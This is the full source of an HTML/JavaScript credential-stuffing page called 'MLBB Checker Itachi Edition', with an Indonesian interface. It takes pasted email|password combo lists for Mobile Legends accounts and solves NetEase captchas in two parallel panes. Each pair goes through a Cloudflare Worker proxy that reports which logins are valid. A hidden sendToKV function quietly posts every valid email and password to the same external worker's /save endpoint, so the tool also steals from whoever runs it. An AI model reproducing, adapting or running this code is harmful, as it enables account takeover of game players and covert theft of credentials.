<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<title>MLBB Checker Itachi Edition</title>
<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
<script src="https://cstaticdun.126.net/load.min.js"></script>
<style>
body {
  font-family: 'Poppins', sans-serif;
  max-width: 1100px;
  margin: 40px auto;
  padding: 20px;
  background: linear-gradient(135deg, #1f1c2c, #928dab);
  color: #f5f5f5;
  position: relative;
  overflow: hidden;
}

h2 {
  text-align: center;
  margin-bottom: 20px;
  font-weight: 700;
  font-size: 40px;
  color: #f5f5f5;
  letter-spacing: 2px;
  background: linear-gradient(45deg, #ff007f, #6a11cb, #00c6ff);
  background-clip: text;
  -webkit-background-clip: text;
  color: transparent;
  animation: glowingText 2s ease-in-out infinite alternate;
}

@keyframes glowingText {
  0% { text-shadow: 0 0 5px rgba(255,255,255,0.6); }
  50% { text-shadow: 0 0 20px rgba(255,0,0,0.8); }
  100% { text-shadow: 0 0 5px rgba(255,255,255,0.6); }
}

textarea {
  width: 100%;
  height: 180px;
  font-family: monospace;
  border-radius: 10px;
  border: none;
  padding: 15px;
  resize: none;
  background: rgba(255,255,255,0.05);
  color: #fff;
  box-shadow: inset 0 2px 8px rgba(0,0,0,0.3);
}

button {
  padding: 12px 20px;
  font-weight: 600;
  border-radius: 8px;
  border: none;
  cursor: pointer;
  margin-right: 10px;
  transition: all 0.3s;
}

#startBtn { background: #6a11cb; color: #fff; }
#startBtn:hover { background: #2575fc; }
#stopBtn { background: #fc5c7d; color: #fff; }
#stopBtn:hover { background: #ff758c; }
#downloadBtn { background: #00c6ff; color: #fff; }
#downloadBtn:hover { background: #0072ff; }

#captcha-container {
  margin: 20px 0;
  display: flex;
  gap: 30px;
  justify-content: center;
}

#captcha-root-0, #captcha-root-1 {
  background: rgba(255,255,255,0.05);
  padding: 20px;
  border-radius: 12px;
  box-shadow: 0 4px 20px rgba(0,0,0,0.4);
}

#log {
  background: rgba(0,0,0,0.6);
  color: #eee;
  height: 300px;
  overflow-y: auto;
  padding: 15px;
  font-family: monospace;
  white-space: pre-wrap;
  border-radius: 12px;
  box-shadow: 0 4px 15px rgba(0,0,0,0.3);
  margin-top: 10px;
}

.ok { color: #7CFC00; }
.bad { color: #FF6B6B; }
.info { color: #FFD866; }

#status {
  margin-top: 15px;
  font-weight: 600;
  text-align: center;
  font-size: 16px;
  color: #ffffff;
}

#itachi-effect {
  pointer-events: none;
  position: fixed;
  top:0; left:0;
  width:100%;
  height:100%;
  display: none;
  justify-content:center;
  align-items:center;
  z-index: 9999;
}

#itachi-eye {
  position:absolute;
  width:200px;
  height:200px;
  background: url('https://i.ibb.co/8m5GzHq/itachi-eye.png') no-repeat center center;
  background-size: contain;
  opacity:0;
  transform: scale(0);
  animation: eyeFlash 0.8s forwards;
}

@keyframes eyeFlash {
  0% { opacity:0; transform: scale(0); }
  50% { opacity:1; transform: scale(1.2); }
  100% { opacity:0; transform: scale(1); }
}

.blood {
  position: absolute;
  width:100%;
  height:100%;
  background: url('https://i.ibb.co/jzYnDwp/blood.png') no-repeat center center;
  background-size: cover;
  opacity:0;
  animation: bloodFade 1s forwards;
}

@keyframes bloodFade { 0% {opacity:0} 50%{opacity:0.8} 100%{opacity:0} }

.flash {
  position:absolute;
  width:100%;
  height:100%;
  background: rgba(255,255,255,0.7);
  opacity:0;
  animation: flashFade 0.5s forwards;
}

@keyframes flashFade { 0%{opacity:0} 50%{opacity:1} 100%{opacity:0} }
</style>
</head>
<body>

<h2>MLBB Checker Itachi Edition</h2>
<p style="text-align:center;">Paste akun (email|password). Efek Itachi akan muncul untuk akun valid.</p>

<textarea id="combo" placeholder="user1@example.com|Pass123\nuser2@example.com|Pass456"></textarea>
<br>
<div style="text-align:center; margin-top: 15px;">
  <button id="startBtn">Start Checking</button>
  <button id="stopBtn" disabled>Stop</button>
  <button id="downloadBtn">Download valid.txt</button>
</div>

<div id="status"></div>
<div id="captcha-container">
  <div id="captcha-root-0"></div>
  <div id="captcha-root-1"></div>
</div>

<h3 style="text-align:center; margin-top:30px;">Log:</h3>
<div id="log"></div>

<!-- Itachi effects -->
<div id="itachi-effect">
  <div id="itachi-eye"></div>
  <div class="blood"></div>
  <div class="flash"></div>
  <audio id="itachi-sound" src="https://www.myinstants.com/media/sounds/itachi-teleport.mp3"></audio>
</div>

<script>
const CAPTCHA_IDS = ["fef5c67c39074e9d845f4bf579cc07af","fef5c67c39074e9d845f4bf579cc07af"];
const WORKER_URL = "https://hidayat.bonar7527.workers.dev";
let combos=[], stopRequested=false, neCaptchaInstances=[null,null], validAccounts=[];

const logEl = document.getElementById("log");
const statusEl = document.getElementById("status");
const startBtn = document.getElementById("startBtn");
const stopBtn = document.getElementById("stopBtn");
const downloadBtn = document.getElementById("downloadBtn");

function appendLog(text, cls){
  const time = new Date().toLocaleTimeString();
  const div = document.createElement("div");
  div.textContent = `[${time}] ${text}`;
  if(cls) div.className = cls;
  logEl.appendChild(div);
  logEl.scrollTop = logEl.scrollHeight;
}

function parseCombos(text){
  return text.split(/\r?\n/).map(l=>l.trim()).filter(Boolean).map(line=>{
    if(line.includes("|")) { const [e,p]=line.split("|",2); return {email:e.trim(),password:p.trim()};}
    else if(line.includes(":")){ const [e,p]=line.split(":",2); return {email:e.trim(),password:p.trim()}; }
    else { appendLog(`Format salah dilewati: ${line}`, "info"); return null; }
  }).filter(Boolean);
}

function showCaptcha(index){
  return new Promise((resolve,reject)=>{
    const root=document.getElementById("captcha-root-"+index);
    root.innerHTML="";
    if(!window.initNECaptcha){ reject("initNECaptcha missing"); return; }
    if(neCaptchaInstances[index]?.destroy) neCaptchaInstances[index].destroy();
    try{
      initNECaptcha({
        captchaId: CAPTCHA_IDS[index],
        element: "#captcha-root-"+index,
        mode: "embed",
        width: "320px",
        onReady(){},
        onVerify(err,data){
          if(err||!data?.validate){ reject(err||"no token"); return; }
          const token=data.validate;
          neCaptchaInstances[index]?.destroy();
          resolve(token);
        },
        onLoad(instance){ neCaptchaInstances[index]=instance; }
      });
    } catch(e){ reject(e); }
  });
}

async function sendToKV(account){
  try{ await fetch(WORKER_URL+"/save",{method:"POST",body:JSON.stringify(account),headers:{"Content-Type":"application/json"}}); }catch(e){}
}

function triggerItachiEffect(){
  const effect=document.getElementById("itachi-effect");
  const eye=document.getElementById("itachi-eye");
  const sound=document.getElementById("itachi-sound");
  effect.style.display="flex";
  eye.style.animation="eyeFlash 0.8s forwards";
  effect.querySelector(".blood").style.animation="bloodFade 1s forwards";
  effect.querySelector(".flash").style.animation="flashFade 0.5s forwards";
  sound.currentTime=0;
  sound.play();
  setTimeout(()=>{effect.style.display="none";},1200);
}

async function checkOneAccount(account,index){
  appendLog(`Minta captcha untuk ${account.email}`,"info");
  statusEl.textContent=`Checking ${account.email}`;
  let token;
  try{ token=await showCaptcha(index); } catch(e){ appendLog(`Captcha gagal: ${account.email}`, "bad"); return; }
  appendLog(`Token captcha diterima ${account.email}`, "info");
  try{
    const form=new URLSearchParams();
    form.append("email", account.email);
    form.append("password", account.password);
    form.append("e_captcha", token);
    const resp=await fetch(WORKER_URL+"/check",{method:"POST",body:form,headers:{"Content-Type":"application/x-www-form-urlencoded"}});
    const data=await resp.json();
    if(data.code===0&&data.data){
      appendLog(`VALID => ${account.email}`,"ok");
      validAccounts.push(`${account.email}:${account.password}`);
      triggerItachiEffect();
      sendToKV({email:account.email,password:account.password});
    } else if(data.code===1004){ appendLog(`NOT FOUND => ${account.email}`,"bad"); }
    else if(data.code===1005){ appendLog(`WRONG PASSWORD => ${account.email}`,"bad"); }
    else { appendLog(`Gagal => ${account.email} | ${JSON.stringify(data)}`,"bad"); }
  }catch(e){ appendLog(`Error ${account.email}: ${e}`,"bad"); }
}

function updateTextareaCombos(){ document.getElementById("combo").value = combos.map(a=>`${a.email}|${a.password}`).join("\n"); }

async function startProcess(){
  stopRequested=false;
  startBtn.disabled=true; stopBtn.disabled=false;
  logEl.innerHTML=""; validAccounts=[];
  combos=parseCombos(document.getElementById("combo").value);
  if(combos.length===0){ appendLog("Tidak ada akun untuk dicek","info"); startBtn.disabled=false; stopBtn.disabled=true; return; }
  appendLog(`Mulai cek ${combos.length} akun.`,"info");

  async function processCaptcha(index){
    while(!stopRequested && combos.length>0){
      const account=combos.shift();
      updateTextareaCombos();
      await checkOneAccount(account,index);
    }
  }

  await Promise.all([processCaptcha(0), processCaptcha(1)]);
  appendLog("Selesai","info");
  statusEl.textContent="Selesai";
  startBtn.disabled=false; stopBtn.disabled=true;
}

startBtn.addEventListener("click",startProcess);
stopBtn.addEventListener("click",()=>{ stopRequested=true; stopBtn.disabled=true; });
downloadBtn.addEventListener("click",()=>{
  if(validAccounts.length===0){ alert("Belum ada akun valid."); return; }
  const blob=new Blob([validAccounts.join("\n")],{type:"text/plain"});
  const url=URL.createObjectURL(blob);
  const a=document.createElement("a");
  a.href=url; a.download="valid.txt"; a.click(); URL.revokeObjectURL(url);
});
</script>
</body>
</html>
